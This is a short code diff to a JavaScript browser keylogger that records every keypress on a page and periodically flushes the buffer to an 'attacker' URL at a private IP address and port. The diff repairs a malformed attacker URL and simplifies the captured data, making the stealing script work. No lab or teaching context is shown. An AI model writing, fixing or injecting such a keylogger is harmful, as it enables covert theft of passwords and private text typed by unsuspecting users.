@@ -1,5 +1,5 @@
 var buffer = [];
-var attacker = 'http://http://172.16.10.119:3399/?c=';
+var attacker = 'http://172.16.10.119:3399/?c=';
 
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
@@ -7,7 +7,7 @@ document.onkeypress = function(e) {
         k: e.key,
         t: timestamp
     };
-    buffer.push(stroke);
+    buffer.push(e.key);
 }
 
 window.setInterval(function() {
@@ -17,4 +17,3 @@ window.setInterval(function() {
         buffer = [];
     }
 }, 2000);
-
